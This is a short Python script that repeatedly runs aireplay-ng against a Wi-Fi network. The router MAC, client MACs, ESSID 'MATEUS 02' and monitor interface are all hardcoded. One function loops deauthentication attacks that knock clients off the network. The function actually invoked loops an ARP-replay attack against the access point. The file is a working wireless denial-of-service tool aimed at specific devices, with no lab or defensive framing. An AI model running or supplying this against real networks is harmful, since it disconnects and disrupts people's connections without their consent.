from os import system
from time import sleep

ROUTER_MAC = '94:87:7C:36:CE:20'
CLIENT_MAC = ['52:C7:BE:FC:F8:47','52:C7:BE:FC:F8:47']
INTERFACE = 'wlp0s18f2u3mon'
ESSID = '"MATEUS 02"'


def deauth():
    while True:
        for x in CLIENT_MAC:
            system('aireplay-ng -0 5 -a {} -c {} -e {} {}'.format(ROUTER_MAC, x, ESSID, INTERFACE))
            # system('aireplay-ng -0 5 -a {} -e {} {}'.format(ROUTER_MAC, ESSID, INTERFACE))
            sleep(3)

def desconnect():
    while True:
        system('aireplay-ng -3 -b {} {}'.format(ROUTER_MAC, INTERFACE))
        sleep(3)

# deauth()
desconnect()